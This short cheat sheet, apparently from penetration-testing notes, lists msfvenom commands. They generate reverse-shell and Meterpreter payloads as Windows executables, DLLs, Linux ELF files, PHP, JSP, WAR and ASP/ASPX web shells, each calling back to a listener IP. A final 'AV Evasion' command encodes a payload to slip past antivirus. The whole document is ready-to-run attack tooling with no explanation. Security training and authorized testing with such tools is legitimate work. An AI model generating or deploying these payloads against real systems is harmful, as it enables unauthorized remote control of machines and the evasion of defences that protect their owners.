##### **Powerful Payload Generator**

**Non Staged Payloads:**
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.176 LPORT=443 -f exe > FileName.exe
```
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.176 LPORT=443 -f dll -o FileName.dll
```
```
msfvenom -p php/reverse_php LHOST=192.168.45.176 LPORT=443 -f raw -o shell.php
```
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.9 LPORT=443 -f war -o shell.war
```
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.45.176 LPORT=443 -f raw -o shell.jsp
```

**Meterpreter Staged Payload:**
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.176 LPORT=443 -f asp -o shell.asp
```
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.176 LPORT=443 -f aspx -o shell.aspx
```
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.45.176 LPORT=443 -f elf -o shell.elf
```
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.45.176 LPORT=443 -f raw -o meterpreter.php
```
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.45.176 LPORT=443 -f elf -o meterpreter.elf
```
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.176 LPORT=443 -f exe -o meterpreter.exe
```
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.176 LPORT=443 -f aspx -o meterpreter.aspx
```


AV Evasion
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.5.101 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 > rTCPenc.exe
```
